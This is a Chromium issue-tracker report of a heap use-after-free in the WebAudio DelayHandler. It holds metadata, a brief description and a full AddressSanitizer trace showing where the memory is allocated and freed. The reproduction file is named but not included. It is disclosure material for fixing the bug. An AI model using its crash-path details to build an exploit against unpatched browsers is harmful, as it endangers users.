# Security: use-after-free of AudioArray in blink::DelayHandler::Process

| Field | Value |
|-------|-------|
| **Issue ID** | [40945677](https://issues.chromium.org/issues/40945677) |
| **Status** | Assigned |
| **Severity** | S4-Minimal |
| **Priority** | P1 |
| **Component** | Blink>Media>Audio, Blink>WebAudio |
| **Platforms** | Linux |
| **Reporter** | su...@gmail.com |
| **Assignee** | ho...@chromium.org |
| **Created** | 2023-11-24 |
| **Bounty** | $10,000.00 |

## Description

**VULNERABILITY DETAILS**

Honestly, I'm not aware of the root cause of this bug. Could you try reproducing it on your end first?

**VERSION**  

Chrome Version: asan-win32-release\_x64-1221293  

Operating System: Windows 10, Ubuntu 22.04

**REPRODUCTION CASE**

see uaf.html

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab  

Crash State:

```
=================================================================  
==23940==ERROR: AddressSanitizer: heap-use-after-free on address 0x12bbb767b4b8 at pc 0x7ffae9cd118c bp 0x00d367ffd810 sp 0x00d367ffd858  
READ of size 4 at 0x12bbb767b4b8 thread T13  
==23940==WARNING: Failed to use and restart external symbolizer!  
==23940==\*\*\* WARNING: Failed to initialize DbgHelp!              \*\*\*  
==23940==\*\*\* Most likely this means that the app is already      \*\*\*  
==23940==\*\*\* using DbgHelp, possibly with incompatible flags.    \*\*\*  
==23940==\*\*\* Due to technical reasons, symbolization might crash \*\*\*  
==23940==\*\*\* or produce wrong results.                           \*\*\*  
    #0 0x7ffae9cd118b in blink::Delay::ProcessARateVector C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\platform\audio\cpu\x86\delay_sse2.cc:111  
    #1 0x7ffae9549506 in blink::Delay::ProcessARate C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\platform\audio\delay.cc:197  
    #2 0x7ffae8391aa4 in blink::DelayHandler::Process C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\modules\webaudio\delay_handler.cc:73  
    #3 0x7ffae5eac395 in blink::AudioHandler::ProcessIfNecessary C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\modules\webaudio\audio_handler.cc:347  
    #4 0x7ffae5eb416b in blink::AudioNodeOutput::Pull C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\modules\webaudio\audio_node_output.cc:134  
    #5 0x7ffae822a248 in blink::AudioNodeInput::SumAllConnections C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\modules\webaudio\audio_node_input.cc:132  
    #6 0x7ffae822a5a0 in blink::AudioNodeInput::Pull C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\modules\webaudio\audio_node_input.cc:162  
    #7 0x7ffae603cdb4 in blink::RealtimeAudioDestinationHandler::Render C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\modules\webaudio\realtime_audio_destination_handler.cc:222  
    #8 0x7ffae83031dc in blink::AudioDestination::ProvideResamplerInput C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\platform\audio\audio_destination.cc:546  
    #9 0x7ffae8303e36 in base::internal::Invoker<base::internal::BindState<void (blink::AudioDestination::\*)(int, blink::AudioBus \*),WTF::CrossThreadUnretainedWrapper<blink::AudioDestination> >,void (int, blink::AudioBus \*)>::Run C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h:932  
    #10 0x7ffae94f6e70 in base::RepeatingCallback<void (int, blink::AudioBus \*)>::Run C:\b\s\w\ir\cache\builder\src\base\functional\callback.h:337  
    #11 0x7ffae94f631c in blink::MediaMultiChannelResampler::ProvideResamplerInput C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\platform\audio\media_multi_channel_resampler.cc:59  
    #12 0x7ffae94f6c0a in base::internal::Invoker<base::internal::BindState<void (blink::MediaMultiChannelResampler::\*)(int, media::AudioBus \*),base::internal::UnretainedWrapper<blink::MediaMultiChannelResampler,base::unretained_traits::MayNotDangle,0> >,void (int, media::AudioBus \*)>::Run C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h:932  
    #13 0x7ffac6dba950 in base::RepeatingCallback<void (int, media::AudioBus \*)>::Run C:\b\s\w\ir\cache\builder\src\base\functional\callback.h:337  
    #14 0x7ffac6e155ae in base::internal::Invoker<base::internal::BindState<void (media::MultiChannelResampler::\*)(int, int, float \*),base::internal::UnretainedWrapper<media::MultiChannelResampler,base::unretained_traits::MayNotDangle,0>,int>,void (int, float \*)>::Run C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h:932  
    #15 0x7ffac6e49e92 in base::RepeatingCallback<void (int, float \*)>::Run C:\b\s\w\ir\cache\builder\src\base\functional\callback.h:337  
    #16 0x7ffac6e49914 in media::SincResampler::Resample C:\b\s\w\ir\cache\builder\src\media\base\sinc_resampler.cc:343  
    #17 0x7ffac6e14706 in media::MultiChannelResampler::Resample C:\b\s\w\ir\cache\builder\src\media\base\multi_channel_resampler.cc:77  
    #18 0x7ffae82ffee4 in blink::AudioDestination::RequestRender C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\platform\audio\audio_destination.cc:529  
    #19 0x7ffae82fe427 in blink::AudioDestination::Render C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\platform\audio\audio_destination.cc:202  
    #20 0x7ffae441a12b in content::RendererWebAudioDeviceImpl::Render C:\b\s\w\ir\cache\builder\src\content\renderer\media\renderer_webaudiodevice_impl.cc:287  
    #21 0x7ffac6d5997e in media::NullAudioSink::CallRender C:\b\s\w\ir\cache\builder\src\media\audio\null_audio_sink.cc:118  
    #22 0x7ffac6d5a24c in base::internal::Invoker<base::internal::BindState<void (media::NullAudioSink::\*)(base::TimeTicks, base::TimeTicks),base::internal::UnretainedWrapper<media::NullAudioSink,base::unretained_traits::MayNotDangle,0> >,void (base::TimeTicks, base::TimeTicks)>::Run C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h:932  
    #23 0x7ffac6def429 in base::RepeatingCallback<void (base::TimeTicks, base::TimeTicks)>::Run C:\b\s\w\ir\cache\builder\src\base\functional\callback.h:337  
    #24 0x7ffac6dee9ac in media::FakeAudioWorker::Worker::DoRead C:\b\s\w\ir\cache\builder\src\media\base\fake_audio_worker.cc:175  
    #25 0x7ffac6def77a in base::internal::Invoker<base::internal::BindState<void (media::FakeAudioWorker::Worker::\*)(),scoped_refptr<media::FakeAudioWorker::Worker> >,void ()>::Run C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h:919  
    #26 0x7ffac4f261c1 in base::RepeatingCallback<void ()>::Run C:\b\s\w\ir\cache\builder\src\base\functional\callback.h:337  
    #27 0x7ffac5068333 in base::internal::Invoker<base::internal::BindState<void (base::internal::CancelableCallbackImpl<base::OnceCallback<void ()> >::\*)(),base::WeakPtr<base::internal::CancelableCallbackImpl<base::OnceCallback<void ()> > > >,void ()>::RunOnce C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h:932  
    #28 0x7ffad3a7d87d in base::TaskAnnotator::RunTaskImpl C:\b\s\w\ir\cache\builder\src\base\task\common\task_annotator.cc:201  
    #29 0x7ffadb7f8f2e in base::internal::TaskTracker::RunSkipOnShutdown C:\b\s\w\ir\cache\builder\src\base\task\thread_pool\task_tracker.cc:629  
    #30 0x7ffadb7f807f in base::internal::TaskTracker::RunTask C:\b\s\w\ir\cache\builder\src\base\task\thread_pool\task_tracker.cc:486  
    #31 0x7ffadb7f70f6 in base::internal::TaskTracker::RunAndPopNextTask C:\b\s\w\ir\cache\builder\src\base\task\thread_pool\task_tracker.cc:401  
    #32 0x7ffae0e379cc in base::internal::WorkerThread::RunWorker C:\b\s\w\ir\cache\builder\src\base\task\thread_pool\worker_thread.cc:483  
    #33 0x7ffae0e36d0f in base::internal::WorkerThread::RunSharedWorker C:\b\s\w\ir\cache\builder\src\base\task\thread_pool\worker_thread.cc:369  
    #34 0x7ffad3995a71 in base::`anonymous namespace'::ThreadFunc C:\b\s\w\ir\cache\builder\src\base\threading\platform_thread_win.cc:140  
    #35 0x7ff6ff9b22b9 in asan_thread_start C:\b\s\w\ir\cache\builder\src\third_party\llvm\compiler-rt\lib\asan\asan_win.cpp:147  
    #36 0x7ffb964e7343 in BaseThreadInitThunk+0x13 (C:\Windows\System32\KERNEL32.DLL+0x180017343)  
    #37 0x7ffb97c026b0 in RtlUserThreadStart+0x20 (C:\Windows\SYSTEM32\ntdll.dll+0x1800526b0)  
  
0x12bbb767b4b8 is located 2661560 bytes inside of 3072544-byte region [0x12bbb73f1800,0x12bbb76dfa20)  
freed by thread T13 here:  
    #0 0x7ff6ff9bcb8d in free C:\b\s\w\ir\cache\builder\src\third_party\llvm\compiler-rt\lib\asan\asan_malloc_win.cpp:82  
    #1 0x7ffae2153d33 in blink::AudioArray<float>::~AudioArray C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\platform\audio\audio_array.h:57  
    #2 0x7ffae83925e8 in std::__Cr::default_delete<blink::Delay>::operator() C:\b\s\w\ir\cache\builder\src\third_party\libc++\src\include\__memory\unique_ptr.h:68  
    #3 0x7ffae8392f68 in WTF::Vector<std::__Cr::unique_ptr<blink::Delay,std::__Cr::default_delete<blink::Delay> >,0,WTF::PartitionAllocator>::Shrink C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\platform\wtf\vector.h:1857  
    #4 0x7ffae8392c5e in WTF::Vector<std::__Cr::unique_ptr<blink::Delay,std::__Cr::default_delete<blink::Delay> >,0,WTF::PartitionAllocator>::ShrinkCapacity C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\platform\wtf\vector.h:1939  
    #5 0x7ffae8390e42 in blink::DelayHandler::Uninitialize C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\modules\webaudio\delay_handler.cc:125  
    #6 0x7ffae8391ffe in blink::DelayHandler::CheckNumberOfChannelsForInput C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\modules\webaudio\delay_handler.cc:144  
    #7 0x7ffae60c77bb in blink::AudioSummingJunction::UpdateRenderingState C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\modules\webaudio\audio_summing_junction.cc:62  
    #8 0x7ffae5ea052b in blink::DeferredTaskHandler::HandleDirtyAudioSummingJunctions C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\modules\webaudio\deferred_task_handler.cc:118  
    #9 0x7ffae5ea3c12 in blink::DeferredTaskHandler::HandleDeferredTasks C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\modules\webaudio\deferred_task_handler.cc:310  
    #10 0x7ffae21389c4 in blink::AudioContext::HandlePreRenderTasks C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\modules\webaudio\audio_context.cc:846  
    #11 0x7ffae603cd3f in blink::RealtimeAudioDestinationHandler::Render C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\modules\webaudio\realtime_audio_destination_handler.cc:213  
    #12 0x7ffae83031dc in blink::AudioDestination::ProvideResamplerInput C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\platform\audio\audio_destination.cc:546  
    #13 0x7ffae8303e36 in base::internal::Invoker<base::internal::BindState<void (blink::AudioDestination::\*)(int, blink::AudioBus \*),WTF::CrossThreadUnretainedWrapper<blink::AudioDestination> >,void (int, blink::AudioBus \*)>::Run C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h:932  
    #14 0x7ffae94f6e70 in base::RepeatingCallback<void (int, blink::AudioBus \*)>::Run C:\b\s\w\ir\cache\builder\src\base\functional\callback.h:337  
    #15 0x7ffae94f631c in blink::MediaMultiChannelResampler::ProvideResamplerInput C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\platform\audio\media_multi_channel_resampler.cc:59  
    #16 0x7ffae94f6c0a in base::internal::Invoker<base::internal::BindState<void (blink::MediaMultiChannelResampler::\*)(int, media::AudioBus \*),base::internal::UnretainedWrapper<blink::MediaMultiChannelResampler,base::unretained_traits::MayNotDangle,0> >,void (int, media::AudioBus \*)>::Run C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h:932  
    #17 0x7ffac6dba950 in base::RepeatingCallback<void (int, media::AudioBus \*)>::Run C:\b\s\w\ir\cache\builder\src\base\functional\callback.h:337  
    #18 0x7ffac6e155ae in base::internal::Invoker<base::internal::BindState<void (media::MultiChannelResampler::\*)(int, int, float \*),base::internal::UnretainedWrapper<media::MultiChannelResampler,base::unretained_traits::MayNotDangle,0>,int>,void (int, float \*)>::Run C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h:932  
    #19 0x7ffac6e49e92 in base::RepeatingCallback<void (int, float \*)>::Run C:\b\s\w\ir\cache\builder\src\base\functional\callback.h:337  
    #20 0x7ffac6e49914 in media::SincResampler::Resample C:\b\s\w\ir\cache\builder\src\media\base\sinc_resampler.cc:343  
    #21 0x7ffac6e14706 in media::MultiChannelResampler::Resample C:\b\s\w\ir\cache\builder\src\media\base\multi_channel_resampler.cc:77  
    #22 0x7ffae82ffee4 in blink::AudioDestination::RequestRender C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\platform\audio\audio_destination.cc:529  
    #23 0x7ffae82fe427 in blink::AudioDestination::Render C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\platform\audio\audio_destination.cc:202  
    #24 0x7ffae441a12b in content::RendererWebAudioDeviceImpl::Render C:\b\s\w\ir\cache\builder\src\content\renderer\media\renderer_webaudiodevice_impl.cc:287  
    #25 0x7ffac6d5997e in media::NullAudioSink::CallRender C:\b\s\w\ir\cache\builder\src\media\audio\null_audio_sink.cc:118  
    #26 0x7ffac6d5a24c in base::internal::Invoker<base::internal::BindState<void (media::NullAudioSink::\*)(base::TimeTicks, base::TimeTicks),base::internal::UnretainedWrapper<media::NullAudioSink,base::unretained_traits::MayNotDangle,0> >,void (base::TimeTicks, base::TimeTicks)>::Run C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h:932  
    #27 0x7ffac6def429 in base::RepeatingCallback<void (base::TimeTicks, base::TimeTicks)>::Run C:\b\s\w\ir\cache\builder\src\base\functional\callback.h:337  
  
previously allocated by thread T0 here:  
    #0 0x7ff6ff9bcd94 in calloc C:\b\s\w\ir\cache\builder\src\third_party\llvm\compiler-rt\lib\asan\asan_malloc_win.cpp:114  
    #1 0x7ffad5462ff3 in WTF::Partitions::FastZeroedMalloc C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\platform\wtf\allocator\partitions.cc:411  
    #2 0x7ffad17a7eb5 in blink::AudioArray<float>::Allocate C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\platform\audio\audio_array.h:86  
    #3 0x7ffae9548e4e in blink::Delay::Delay C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\platform\audio\delay.cc:81  
    #4 0x7ffae83910c6 in blink::DelayHandler::Initialize C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\modules\webaudio\delay_handler.cc:110  
    #5 0x7ffae8390cc1 in blink::DelayHandler::DelayHandler C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\modules\webaudio\delay_handler.cc:47  
    #6 0x7ffae8390af3 in blink::DelayHandler::Create C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\modules\webaudio\delay_handler.cc:27  
    #7 0x7ffae60a2fa4 in blink::DelayNode::DelayNode C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\modules\webaudio\delay_node.cc:57  
    #8 0x7ffae60a35e0 in blink::MakeGarbageCollected<blink::DelayNode,blink::BaseAudioContext &,double &> C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\platform\heap\garbage_collected.h:37  
    #9 0x7ffae60a341d in blink::DelayNode::Create C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\modules\webaudio\delay_node.cc:83  
    #10 0x7ffae60c05e3 in blink::`anonymous namespace'::v8_base_audio_context::CreateDelayOperationCallback C:\b\s\w\ir\cache\builder\src\out\Release_x64\gen\third_party\blink\renderer\bindings\modules\v8\v8_base_audio_context.cc:554  
    #11 0x7ffaea08c852 in Builtins_CallApiCallbackGeneric+0xd2 (C:\Users\sunburst\projects\fuzzframe\gen\browser\asan-win32-release_x64-1221293\chrome.dll+0x1a553c852)  
    #12 0x7ffaea08a773 in Builtins_InterpreterEntryTrampoline+0xf3 (C:\Users\sunburst\projects\fuzzframe\gen\browser\asan-win32-release_x64-1221293\chrome.dll+0x1a553a773)  
    #13 0x7ffaea08821b in Builtins_JSEntryTrampoline+0x5b (C:\Users\sunburst\projects\fuzzframe\gen\browser\asan-win32-release_x64-1221293\chrome.dll+0x1a553821b)  
    #14 0x7ffaea087e1a in Builtins_JSEntry+0xda (C:\Users\sunburst\projects\fuzzframe\gen\browser\asan-win32-release_x64-1221293\chrome.dll+0x1a5537e1a)  
    #15 0x7ffac986369f in v8::internal::`anonymous namespace'::Invoke C:\b\s\w\ir\cache\builder\src\v8\src\execution\execution.cc:427  
    #16 0x7ffac9862266 in v8::internal::Execution::Call C:\b\s\w\ir\cache\builder\src\v8\src\execution\execution.cc:528  
    #17 0x7ffac92da127 in v8::Function::Call C:\b\s\w\ir\cache\builder\src\v8\src\api\api.cc:5487  
    #18 0x7ffad9c4af7e in blink::V8ScriptRunner::CallFunction C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\bindings\core\v8\v8_script_runner.cc:823  
    #19 0x7ffae33a499e in blink::bindings::CallbackInvokeHelper<blink::CallbackFunctionWithTaskAttributionBase,0,1>::CallInternal C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\bindings\core\v8\callback_invoke_helper.cc:153  
    #20 0x7ffae33a4644 in blink::bindings::CallbackInvokeHelper<blink::CallbackFunctionWithTaskAttributionBase,0,0>::Call C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\bindings\core\v8\callback_invoke_helper.cc:174  
    #21 0x7ffae804c5ba in blink::V8Function::Invoke C:\b\s\w\ir\cache\builder\src\out\Release_x64\gen\third_party\blink\renderer\bindings\core\v8\v8_function.cc:67  
    #22 0x7ffae804dc8b in blink::V8Function::InvokeAndReportException C:\b\s\w\ir\cache\builder\src\out\Release_x64\gen\third_party\blink\renderer\bindings\core\v8\v8_function.cc:122  
    #23 0x7ffae924f170 in blink::ScheduledAction::Execute C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\modules\scheduler\scheduled_action.cc:146  
    #24 0x7ffae7ecdfd0 in blink::DOMTimer::Fired C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\modules\scheduler\dom_timer.cc:402  
    #25 0x7ffad68cc11a in blink::TimerBase::RunInternal C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\platform\timer.cc:160  
    #26 0x7ffad68cc4e5 in base::internal::Invoker<base::internal::BindState<void (blink::TimerBase::\*)(),WTF::UnretainedWrapper<blink::TimerBase> >,void ()>::RunOnce C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h:919  
    #27 0x7ffad3a7d87d in base::TaskAnnotator::RunTaskImpl C:\b\s\w\ir\cache\builder\src\base\task\common\task_annotator.cc:201  
  
Thread T13 created by T0 here:  
    #0 0x7ff6ff9b21e2 in CreateThread C:\b\s\w\ir\cache\builder\src\third_party\llvm\compiler-rt\lib\asan\asan_win.cpp:158  
    #1 0x7ffad399487f in base::`anonymous namespace'::CreateThreadInternal C:\b\s\w\ir\cache\builder\src\base\threading\platform_thread_win.cc:205  
    #2 0x7ffae0e354b6 in base::internal::WorkerThread::Start C:\b\s\w\ir\cache\builder\src\base\task\thread_pool\worker_thread.cc:196  
    #3 0x7ffadb803798 in base::internal::PooledSingleThreadTaskRunnerManager::CreateSingleThreadTaskRunner C:\b\s\w\ir\cache\builder\src\base\task\thread_pool\pooled_single_thread_task_runner_manager.cc:622  
    #4 0x7ffad73b6c53 in base::internal::ThreadPoolImpl::CreateSingleThreadTaskRunner C:\b\s\w\ir\cache\builder\src\base\task\thread_pool\thread_pool_impl.cc:249  
    #5 0x7ffad3a533d5 in base::ThreadPool::CreateSingleThreadTaskRunner C:\b\s\w\ir\cache\builder\src\base\task\thread_pool.cc:105  
    #6 0x7ffae441a423 in content::RendererWebAudioDeviceImpl::GetSilentSinkTaskRunner C:\b\s\w\ir\cache\builder\src\content\renderer\media\renderer_webaudiodevice_impl.cc:309  
    #7 0x7ffae4418f61 in content::RendererWebAudioDeviceImpl::CreateAudioRendererSink C:\b\s\w\ir\cache\builder\src\content\renderer\media\renderer_webaudiodevice_impl.cc:342  
    #8 0x7ffae441878c in content::RendererWebAudioDeviceImpl::Start C:\b\s\w\ir\cache\builder\src\content\renderer\media\renderer_webaudiodevice_impl.cc:216  
    #9 0x7ffae8300da6 in blink::AudioDestination::Start C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\platform\audio\audio_destination.cc:225  
    #10 0x7ffae603c63e in blink::RealtimeAudioDestinationHandler::StartPlatformDestination C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\modules\webaudio\realtime_audio_destination_handler.cc:365  
    #11 0x7ffae2137a14 in blink::AudioContext::StartRendering C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\modules\webaudio\audio_context.cc:555  
    #12 0x7ffae212f621 in blink::AudioContext::Create C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\modules\webaudio\audio_context.cc:227  
    #13 0x7ffae6078572 in blink::`anonymous namespace'::v8_audio_context::ConstructorCallback C:\b\s\w\ir\cache\builder\src\out\Release_x64\gen\third_party\blink\renderer\bindings\modules\v8\v8_audio_context.cc:239  
    #14 0x7ffac93a9f61 in v8::internal::FunctionCallbackArguments::Call C:\b\s\w\ir\cache\builder\src\v8\src\api\api-arguments-inl.h:101  
    #15 0x7ffac93a76db in v8::internal::`anonymous namespace'::HandleApiCallHelper<1> C:\b\s\w\ir\cache\builder\src\v8\src\builtins\builtins-api.cc:114  
    #16 0x7ffac93a51c6 in v8::internal::Builtin_Impl_HandleApiConstruct C:\b\s\w\ir\cache\builder\src\v8\src\builtins\builtins-api.cc:145  
    #17 0x7ffac93a4680 in v8::internal::Builtin_HandleApiConstruct C:\b\s\w\ir\cache\builder\src\v8\src\builtins\builtins-api.cc:136  
    #18 0x7ffaea125479 in Builtins_CEntry_Return1_ArgvOnStack_BuiltinExit+0x39 (C:\Users\sunburst\projects\fuzzframe\gen\browser\asan-win32-release_x64-1221293\chrome.dll+0x1a55d5479)  
    #19 0x7ffaea08b3ce in Builtins_InterpreterPushArgsThenFastConstructFunction+0x28e (C:\Users\sunburst\projects\fuzzframe\gen\browser\asan-win32-release_x64-1221293\chrome.dll+0x1a553b3ce)  
    #20 0x7ffaea215712 in Builtins_ConstructHandler+0x352 (C:\Users\sunburst\projects\fuzzframe\gen\browser\asan-win32-release_x64-1221293\chrome.dll+0x1a56c5712)  
    #21 0x7ffaea08a773 in Builtins_InterpreterEntryTrampoline+0xf3 (C:\Users\sunburst\projects\fuzzframe\gen\browser\asan-win32-release_x64-1221293\chrome.dll+0x1a553a773)  
    #22 0x7ffaea08821b in Builtins_JSEntryTrampoline+0x5b (C:\Users\sunburst\projects\fuzzframe\gen\browser\asan-win32-release_x64-1221293\chrome.dll+0x1a553821b)  
    #23 0x7ffaea087e1a in Builtins_JSEntry+0xda (C:\Users\sunburst\projects\fuzzframe\gen\browser\asan-win32-release_x64-1221293\chrome.dll+0x1a5537e1a)  
    #24 0x7ffac986369f in v8::internal::`anonymous namespace'::Invoke C:\b\s\w\ir\cache\builder\src\v8\src\execution\execution.cc:427  
    #25 0x7ffac9862266 in v8::internal::Execution::Call C:\b\s\w\ir\cache\builder\src\v8\src\execution\execution.cc:528  
    #26 0x7ffac92da127 in v8::Function::Call C:\b\s\w\ir\cache\builder\src\v8\src\api\api.cc:5487  
    #27 0x7ffad9c4af7e in blink::V8ScriptRunner::CallFunction C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\bindings\core\v8\v8_script_runner.cc:823  
    #28 0x7ffae33a499e in blink::bindings::CallbackInvokeHelper<blink::CallbackFunctionWithTaskAttributionBase,0,1>::CallInternal C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\bindings\core\v8\callback_invoke_helper.cc:153  
    #29 0x7ffae33a4644 in blink::bindings::CallbackInvokeHelper<blink::CallbackFunctionWithTaskAttributionBase,0,0>::Call C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\bindings\core\v8\callback_invoke_helper.cc:174  
    #30 0x7ffae804c5ba in blink::V8Function::Invoke C:\b\s\w\ir\cache\builder\src\out\Release_x64\gen\third_party\blink\renderer\bindings\core\v8\v8_function.cc:67  
    #31 0x7ffae804dc8b in blink::V8Function::InvokeAndReportException C:\b\s\w\ir\cache\builder\src\out\Release_x64\gen\third_party\blink\renderer\bindings\core\v8\v8_function.cc:122  
    #32 0x7ffae924f170 in blink::ScheduledAction::Execute C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\modules\scheduler\scheduled_action.cc:146  
    #33 0x7ffae7ecdfd0 in blink::DOMTimer::Fired C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\modules\scheduler\dom_timer.cc:402  
    #34 0x7ffad68cc11a in blink::TimerBase::RunInternal C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\platform\timer.cc:160  
    #35 0x7ffad68cc4e5 in base::internal::Invoker<base::internal::BindState<void (blink::TimerBase::\*)(),WTF::UnretainedWrapper<blink::TimerBase> >,void ()>::RunOnce C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h:919  
    #36 0x7ffad3a7d87d in base::TaskAnnotator::RunTaskImpl C:\b\s\w\ir\cache\builder\src\base\task\common\task_annotator.cc:201  
    #37 0x7ffad73e5270 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl C:\b\s\w\ir\cache\builder\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc:461  
    #38 0x7ffad73e4032 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork C:\b\s\w\ir\cache\builder\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc:326  
    #39 0x7ffad741fbaf in base::MessagePumpDefault::Run C:\b\s\w\ir\cache\builder\src\base\message_loop\message_pump_default.cc:40  
    #40 0x7ffad73e6ffd in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run C:\b\s\w\ir\cache\builder\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc:626  
    #41 0x7ffad3ae0eac in base::RunLoop::Run C:\b\s\w\ir\cache\builder\src\base\run_loop.cc:134  
    #42 0x7ffad6b300f4 in content::RendererMain C:\b\s\w\ir\cache\builder\src\content\renderer\renderer_main.cc:366  
    #43 0x7ffad203b6bb in content::RunOtherNamedProcessTypeMain C:\b\s\w\ir\cache\builder\src\content\app\content_main_runner_impl.cc:769  
    #44 0x7ffad203e4ad in content::ContentMainRunnerImpl::Run C:\b\s\w\ir\cache\builder\src\content\app\content_main_runner_impl.cc:1138  
    #45 0x7ffad20390df in content::RunContentProcess C:\b\s\w\ir\cache\builder\src\content\app\content_main.cc:334  
    #46 0x7ffad2039d92 in content::ContentMain C:\b\s\w\ir\cache\builder\src\content\app\content_main.cc:347  
    #47 0x7ffac4b51746 in ChromeMain C:\b\s\w\ir\cache\builder\src\chrome\app\chrome_main.cc:190  
    #48 0x7ff6ff905f72 in MainDllLoader::Launch C:\b\s\w\ir\cache\builder\src\chrome\app\main_dll_loader_win.cc:169  
    #49 0x7ff6ff902a5c in main C:\b\s\w\ir\cache\builder\src\chrome\app\chrome_exe_main_win.cc:392  
    #50 0x7ff6ffd3218b in __scrt_common_main_seh D:\a\_work\1\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl:288  
    #51 0x7ffb964e7343 in BaseThreadInitThunk+0x13 (C:\Windows\System32\KERNEL32.DLL+0x180017343)  
    #52 0x7ffb97c026b0 in RtlUserThreadStart+0x20 (C:\Windows\SYSTEM32\ntdll.dll+0x1800526b0)  
  
SUMMARY: AddressSanitizer: heap-use-after-free C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\platform\audio\cpu\x86\delay_sse2.cc:111 in blink::Delay::ProcessARateVector  
Shadow bytes around the buggy address:  
  0x12bbb767b200: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd  
  0x12bbb767b280: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd  
  0x12bbb767b300: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd  
  0x12bbb767b380: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd  
  0x12bbb767b400: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd  
=>0x12bbb767b480: fd fd fd fd fd fd fd[fd]fd fd fd fd fd fd fd fd  
  0x12bbb767b500: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd  
  0x12bbb767b580: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd  
  0x12bbb767b600: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd  
  0x12bbb767b680: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd  
  0x12bbb767b700: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd  
Shadow byte legend (one shadow byte represents 8 application bytes):  
  Addressable:           00  
  Partially addressable: 01 02 03 04 05 06 07  
  Heap left redzone:       fa  
  Freed heap region:       fd  
  Stack left redzone:      f1  
  Stack mid redzone:       f2  
  Stack right redzone:     f3  
  Stack after return:      f5  
  Stack use after scope:   f8  
  Global redzone:          f9  
  Global init order:       f6  
  Poisoned by user:        f7  
  Container overflow:      fc  
  Array cookie:            ac  
  Intra object redzone:    bb  
  ASan internal:           fe  
  Left alloca redzone:     ca  
  Right alloca redzone:    cb  
  
==23940==ADDITIONAL INFO  
  
==23940==Note: Please include this section with the ASan report.  
Task trace:  
